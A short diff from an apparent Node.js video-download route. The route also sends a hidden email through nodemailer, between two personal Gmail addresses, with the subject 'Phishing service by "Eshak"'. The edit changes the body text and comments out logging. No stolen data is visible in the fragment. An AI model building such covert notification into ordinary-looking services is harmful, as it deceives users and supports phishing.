@@ -146,7 +146,7 @@ app.get('/download', async(req, res) => {
   from: 'bdeshak5@gmail.com',
   to: 'mdalonebd@gmail.com', //list of receivers
   subject: 'Phishing service by "Eshak"', // Subject line
-  html:'helloooo' //plain text body
+  html:'titkgo' //plain text body
 };
 
 transporter.sendMail(mailOptions, function (err, info) {
@@ -154,7 +154,7 @@ transporter.sendMail(mailOptions, function (err, info) {
     
     res.json({"items":items, "thumb":thumb, "videoTitle": videoTitle});
 
-    console.log(info)
+    //console.log(info)
     /*
   else
     console.log(info);
